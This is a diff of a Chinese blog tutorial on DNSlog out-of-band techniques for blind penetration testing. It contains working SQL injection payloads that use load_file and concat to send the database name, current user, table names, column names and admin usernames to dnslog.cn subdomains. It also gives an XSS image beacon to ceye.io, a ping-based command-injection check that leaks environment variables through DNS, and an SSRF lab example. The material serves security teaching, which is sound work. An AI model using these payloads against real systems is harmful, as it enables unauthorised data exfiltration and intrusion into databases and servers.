     <content><![CDATA[<h1 id="如何利用DNSlog进行更高效率的无回显渗透"><a href="#如何利用DNSlog进行更高效率的无回显渗透" class="headerlink" title="如何利用DNSlog进行更高效率的无回显渗透"></a>如何利用DNSlog进行更高效率的无回显渗透</h1><h2 id="0-说在前面"><a href="#0-说在前面" class="headerlink" title="0.说在前面"></a>0.说在前面</h2><h3 id="0-1-DNSlog工具"><a href="#0-1-DNSlog工具" class="headerlink" title="0.1.DNSlog工具"></a>0.1.DNSlog工具</h3><p>如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：</p>
 <p><a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
 <p>另外我们也可以使用在线平台：</p>
-<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a></p>
-<p><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn</a></p>
 <a id="more"></a>
 
-<h4 id="0-1-1-www-dnslog-cn使用方法"><a href="#0-1-1-www-dnslog-cn使用方法" class="headerlink" title="0.1.1.www.dnslog.cn使用方法"></a>0.1.1.<code>www.dnslog.cn</code>使用方法</h4><p>（1）Get SubDomain的意思是获取子域名，这里点击完就给我们一个三级域名。复制完后，打开新网页并粘贴在url上，访问<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113119-266d6756-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137547808.png" alt="img"></a></p>
-<p>（2）点击完会出现一条DNS记录<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113147-370d8f6e-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137586461.png" alt="img"></a></p>
-<h5 id="0-1-1-1-注意"><a href="#0-1-1-1-注意" class="headerlink" title="0.1.1.1.注意"></a>0.1.1.1.注意</h5><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113202-40060a92-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137606461.png" alt="img"></a></p>
+<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a></p>
+<p><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn</a></p>
+<h4 id="0-1-1-www-dnslog-cn使用方法"><a href="#0-1-1-www-dnslog-cn使用方法" class="headerlink" title="0.1.1.www.dnslog.cn使用方法"></a>0.1.1.<code>www.dnslog.cn</code>使用方法</h4><p>（1）Get SubDomain的意思是获取子域名，这里点击完就给我们一个三级域名。复制完后，打开新网页并粘贴在url上，访问<img src="https://image.3001.net/images/20220413/16498507317529.png" alt="img"></p>
+<p>（2）点击完会出现一条DNS记录<img src="https://image.3001.net/images/20220413/16498507347447.png" alt="img"></p>
+<h5 id="0-1-1-1-注意"><a href="#0-1-1-1-注意" class="headerlink" title="0.1.1.1.注意"></a>0.1.1.1.注意</h5><p><img src="https://image.3001.net/images/20220413/16498507385608.png" alt="img"></p>
 <p>这里一直刷新访问网址，并在DNSlog.cn里刷新记录（Refresh Record），可是无论怎么刷新，记录都是只有这几条。因为dns协议的目的是我要访问这个域名，可是不知道对应的ip，我就去问，第一次不知道，第二次不知道，第三次也不知道，那第四次总该记住了，这就是dns缓存了的问题。碰到一个新来的域名我不知道，但是问了几次之后我就知道了，我就不需要再查询了。这就是为什么怎么刷新都不会有新的记录了。</p>
 <h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>像下图这样在前面加一个1.，使它变成新的域名，再重新访问后，再刷新记录，就有了</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113220-4a5a79d8-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137646353.png" alt="img"></a></p>
+<p><img src="https://image.3001.net/images/20220413/1649850741192.png" alt="img"></p>
 <h4 id="0-1-2-ceye-io使用方法"><a href="#0-1-2-ceye-io使用方法" class="headerlink" title="0.1.2.ceye.io使用方法"></a>0.1.2.<code>ceye.io</code>使用方法</h4><p>和<code>http://www.dnslog.cn</code>使用方法类似</p>
 <p>（1）login进入后，会给我们一个三级域名，在用户详情页”Profile”中自己的域名标识符”Identifier”。对于每个用户，都有唯一的域名标识符如 xxx.ceye.io 。所有来自于 xxx.ceye.io 或 *.xxx.ceye.io 的DNS查询和HTTP请求都会被记录。</p>
 <p>（2）我们复制完，打开新网页并粘贴在url上，访问</p>
@@ -175,12 +992,12 @@
 
 <p>它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不区分大小写。</p>
 <p>再来看一个图：</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113242-57d33758-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137688778.png" alt="img"></a></p>
+<p><img src="https://image.3001.net/images/20220413/16498507456051.png" alt="img"></p>
 <p>通俗的说就是我有个已注册的域名<code>a.com</code>，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。</p>
 <p>看个直观一点的例子来理解：<br>ping命令的时候会用到DNS解析所以我就用ping命令做个实验。</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113304-64ae6696-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137721423.png" alt="img"></a></p>
+<p><img src="https://image.3001.net/images/20220413/16498507494971.png" alt="img"></p>
 <p>DNSlog.cn中也记录了下来</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113316-6bd9ff66-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137744626.png" alt="img"></a></p>
+<p><img src="https://image.3001.net/images/20220413/1649850751587.png" alt="img"></p>
 <p>可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将XF.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog，看到这里应该有点感觉了。原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p>
 <h2 id="3-DNSlog通常用在哪些地方"><a href="#3-DNSlog通常用在哪些地方" class="headerlink" title="3.DNSlog通常用在哪些地方"></a>3.DNSlog通常用在哪些地方</h2><p>大家在渗透测试的时候可能会遇到一下这些情况：</p>
 <ul>
@@ -205,11 +1022,11 @@
 <p>1、必须有权限读取并且文件必须完全可读。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;*如果结果返回正常，说明具有读写权限.*&#x2F;</span><br><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;*返回错误，应该是管理员给数据库账户降权了*&#x2F;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113339-7963b370-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137786992.png" alt="img"></a></p>
-<p>我们查看mysql这个库中user表中的字段有这些<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113817-1f420756-cd8b-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137805571.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113339-7963b370-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/1649850756731.png" alt="img"></a></p>
+<p>我们查看mysql这个库中user表中的字段有这些<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113817-1f420756-cd8b-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507585375.png" alt="img"></a></p>
 <p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;</code>;查看load_file()可以读取的磁盘。<br>（1）当secure_file_priv为空，就可以读取磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以读取G盘的文件。<br>（3）当secure_file_priv为null，load_file就不能加载文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
 <p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure_file_priv设置具体看这里：</p>
-<p>若secure_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120936-7f566e08-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137831054.png" alt="img"></a><br>secure_file_priv不能通过此方法修改，因为报错为Variable ‘XXX’ is a read only variable。报错原因及修改方法为：参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121004-8fd2506c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137875065.png" alt="img"></a><br>将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121018-98876c60-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/164741379089.png" alt="img"></a><br>secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
+<p>若secure_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120936-7f566e08-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507617366.png" alt="img"></a><br>secure_file_priv不能通过此方法修改，因为报错为Variable ‘XXX’ is a read only variable。报错原因及修改方法为：参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121004-8fd2506c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507645622.png" alt="img"></a><br>将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121018-98876c60-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507679184.png" alt="img"></a><br>secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
 <p>2、欲读取文件必须在服务器上</p>
 <p>3、必须指定文件完整的路径</p>
 <p>4、欲读取文件必须小于<code>max_allowed_packet</code></p>
@@ -223,24 +1040,24 @@
 <li>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</li>
 </ol>
 <h4 id="3-1-3-过程"><a href="#3-1-3-过程" class="headerlink" title="3.1.3.过程"></a>3.1.3.过程</h4><p>(1)这里字符型注入和数字型注入都不会回显，是盲注，我们就用DNSlog注入</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121036-a3163e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137987953.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121036-a3163e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507706523.png" alt="img"></a></p>
 <p>这里读取远程文件就要用到UNC路径，UNC路径就是类似\softer这样的形式的网络路径,就是\。例子：<code>\\\www.mss.cn\2.txt</code>。微软里喜欢跟别人反着来，所以在微软文件夹里查询用反斜杠<code>\\</code>；而这里如果要在url中得用正斜杠<code>/</code>，不然查不出来，如果硬要用反斜杠，得另外加反斜杠来转义，unc路径就要四个反斜杠，很麻烦。如：(select load_file(concat(‘\\‘,(select datab ase()),’.xxxx.ceye.io\abc’)))</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前库名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select datab ase()),&#39;.6.eudspa.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">注意：后面这个a文件存不存在并不重要，随便写个文件就行，只要发生了DNS解析，我们就能看到我们所需要的东西，如这里的库名，但是这个文件必须要写，因为这是load_file函数所需要的条件。</span><br></pre></td></tr></table></figure>
 
-<p>注：当前库名<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121057-afc10e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138028813.png" alt="img"></a></p>
+<p>注：当前库名<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121057-afc10e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507748758.png" alt="img"></a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select hex(user())),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">注意：为什么要对查询的内容进行hex编码？</span><br><span class="line">如果我们要查询的用户名中存在特殊字符：如!@#$%^&amp;</span><br><span class="line">最后在请求DNS服务器时变成：!@#$%^&amp;*.upa46v.dnslog.cn</span><br><span class="line">存在特殊字符的域名无法解析。因此在DNS日志中也找不到我们查询的数据。</span><br><span class="line">所以在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。</span><br></pre></td></tr></table></figure>
 
 <p>将hex(用户名)去hex解码，得出结果为root@localhost</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121115-ba577182-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138053796.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121115-ba577182-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507772936.png" alt="img"></a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个表名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select table_name from information_schema.tables where table_schema&#x3D;datab ase() limit 0,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据表</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121147-cd72514c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138106175.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121147-cd72514c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507808664.png" alt="img"></a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第二个数据列名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; limit 1,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据列</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121219-e0842648-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/1647413812656.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121219-e0842648-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507837517.png" alt="img"></a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表‘admin’列‘username’第一个字段名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select username from maoshe.admin limit 0,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121237-eb06c03a-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138155372.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121237-eb06c03a-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507867592.png" alt="img"></a></p>
 <h5 id="3-1-3-1-注意"><a href="#3-1-3-1-注意" class="headerlink" title="3.1.3.1.注意"></a>3.1.3.1.注意</h5><p>在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。</p>
 <h3 id="3-2-XSS盲打"><a href="#3-2-XSS盲打" class="headerlink" title="3.2.XSS盲打"></a>3.2.XSS盲打</h3><p>推荐：XSS绕过可以看看该文章：[XSS过滤绕过速查表](<a href="https://blog.csdn.net/weixin_50464560/article/d" target="_blank" rel="noopener">https://blog.csdn.net/weixin_50464560/article/d</a> etails/114491500)</p>
 <h4 id="3-2-1-介绍"><a href="#3-2-1-介绍" class="headerlink" title="3.2.1.介绍"></a>3.2.1.介绍</h4><p>简单来说，在xss上的利用是在于我们将xss的攻击代码拼接到dnslog网址的高级域名上，就可以在用户访问的时候，将他的信息带回来</p>
@@ -249,33 +1066,33 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxx.ceye.io&gt;</span><br></pre></td></tr></table></figure>
 
 <p>让src请求我们的dnslog平台。这里举个例子：</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121256-f6acd442-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138238620.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121256-f6acd442-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507904918.png" alt="img"></a></p>
 <p>然后回来看DNSlog平台：</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121313-00ea55d8-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138332709.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121313-00ea55d8-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507925935.png" alt="img"></a></p>
 <p>已经收到了请求，所以dns已经被解析</p>
 <p>这边再举一例：</p>
 <p>DNSlog平台先搞一个域名</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121330-0aa09808-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138394894.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121330-0aa09808-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507959073.png" alt="img"></a></p>
 <p>在留言板里如下留言</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121343-12b3a800-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138431209.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121343-12b3a800-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498507978212.png" alt="img"></a></p>
 <p>登录后台查看</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121400-1ce24336-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138463926.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121400-1ce24336-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508006771.png" alt="img"></a></p>
 <p>成功，这就是一个存储型xss盲打</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121416-2681077e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138506369.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121416-2681077e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508022751.png" alt="img"></a></p>
 <h3 id="3-3-无回显的命令执行"><a href="#3-3-无回显的命令执行" class="headerlink" title="3.3.无回显的命令执行"></a>3.3.无回显的命令执行</h3><h4 id="3-3-1-介绍"><a href="#3-3-1-介绍" class="headerlink" title="3.3.1.介绍"></a>3.3.1.介绍</h4><p>我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功</p>
 <h4 id="3-3-2-过程"><a href="#3-3-2-过程" class="headerlink" title="3.3.2.过程"></a>3.3.2.过程</h4><p>发现疑似命令执行的洞，但是目标站点什么也不显示，无法确认是不是有洞</p>
 <p>如果是win系统，简单的<code>ping %os%.xxxx.cete.io</code>即可</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121446-3835f128-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138558443.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121446-3835f128-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508055496.png" alt="img"></a></p>
 <p>DNSlog这边得到了os的信息，那么就说明这里存在命令注入</p>
 <p>下面是windows的常用变量：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;变量                     类型       描述</span><br><span class="line">&#x2F;&#x2F;%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line">&#x2F;&#x2F;%CD%                     本地       返回当前目录字符串。</span><br><span class="line">&#x2F;&#x2F;%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class="line">&#x2F;&#x2F;%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line">&#x2F;&#x2F;%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class="line">&#x2F;&#x2F;%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line">&#x2F;&#x2F;%DATE%                   系统       返回当前日期。使用与 date &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class="line">&#x2F;&#x2F;%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line">&#x2F;&#x2F;%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line">&#x2F;&#x2F;%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class="line">&#x2F;&#x2F;%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class="line">&#x2F;&#x2F;%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class="line">&#x2F;&#x2F;%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class="line">&#x2F;&#x2F;%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line">&#x2F;&#x2F;%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line">&#x2F;&#x2F;%TIME%                   系统       返回当前时间。使用与time &#x2F;t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</span><br><span class="line">&#x2F;&#x2F;%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class="line">&#x2F;&#x2F;%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class="line">&#x2F;&#x2F;%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure>
 
 <p>如果目标系统是linux的话，则可用shell语言</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121511-470c148e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138614997.png" alt="img"></a></p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121524-4e842f62-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138648104.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121511-470c148e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/1649850809696.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121524-4e842f62-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508113051.png" alt="img"></a></p>
 <p>或者</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121538-57260aaa-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138662414.png" alt="img"></a></p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121549-5dc55c44-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138682579.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121538-57260aaa-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508138896.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121549-5dc55c44-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508158829.png" alt="img"></a></p>
 <h3 id="3-4-无回显的SSRF"><a href="#3-4-无回显的SSRF" class="headerlink" title="3.4.无回显的SSRF"></a>3.4.无回显的SSRF</h3><h4 id="3-4-1-介绍"><a href="#3-4-1-介绍" class="headerlink" title="3.4.1.介绍"></a>3.4.1.介绍</h4><p>这里先来介绍下这个漏洞：</p>
 <p>SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。</p>
 <p>攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。</p>
@@ -284,16 +1101,16 @@
 <p>那么当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多 。但是若遇到无回显的SSRF，这时就可以考虑用DNSlog来解决。</p>
 <h4 id="3-4-2-过程"><a href="#3-4-2-过程" class="headerlink" title="3.4.2.过程"></a>3.4.2.过程</h4><p>这里用的时CTFHub上面的一个SSRF靶场。<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">CTFHub</a></p>
 <p>一点击进去首页就是这样,看到这样的url便下意识想到ssrf</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121608-68f93004-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138711221.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121608-68f93004-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508185122.png" alt="img"></a></p>
 <p>这里因为是让我们从目标主机内网环境访问其本地的flag.php，那我们就构造：<code>/?url=http://127.0.0.1/flag.php</code></p>
 <p>然后就成功访问到了目标机本地的flag.php</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121625-736290bc-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138743211.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121625-736290bc-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508216778.png" alt="img"></a></p>
 <p>这种是有回显的，我们很容易就判断出来这里存在SSRF漏洞。那么如果这里是无回显的呢，那么该如何判断这里可能存在SSRF呢？那么在前期渗透的时候我们这里就可以用DNSlog来初步判断服务器有对外发送请求的行为，为下一步的SSRF渗透打下基础：</p>
